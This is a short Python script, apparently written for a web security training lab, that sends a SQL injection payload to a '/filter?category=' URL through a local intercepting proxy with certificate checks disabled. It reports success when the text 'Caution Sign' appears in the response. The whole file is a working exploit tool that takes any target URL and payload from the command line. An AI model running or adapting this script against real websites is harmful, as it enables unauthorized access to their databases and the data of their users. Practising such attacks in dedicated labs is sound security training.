import requests 
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}

def expoit_sqli(url, payload):
    path = '/filter?category='
    r = requests.get(url + path + payload, verify = False, proxies = proxies)
    if "Caution Sign" in r.text:
        return True
    else:
        return False

def main():
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f"[~]Usage: {sys.argv[0]} <url> <payload> ")       
        print(f"[~]Example: {sys.argv[0]} www.example.com '1=1' ")
        sys.exit(-1)
    
    if expoit_sqli(url, payload):
        print("[+] SQL Injection successful :-)")
    else:
        print("[+] SQL Injection unsuccessful :-(")


if __name__ == "__main__":
    main()
